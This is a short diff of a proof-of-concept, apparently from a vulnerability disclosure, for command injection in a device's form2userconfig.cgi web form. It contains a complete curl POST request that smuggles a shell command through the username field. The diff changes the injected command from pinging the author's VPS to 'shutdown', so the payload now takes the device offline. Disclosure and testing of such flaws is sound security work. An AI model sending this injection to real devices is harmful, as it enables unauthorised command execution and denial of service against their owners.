@@ -11,9 +11,8 @@
 
 ##### POC&&EXP
 
-input vps ip
 
 ```
-curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin';ping vps;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
+curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin';shutdown;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
 ```
-Now it will ping my VPS address
+Now it will shutdown
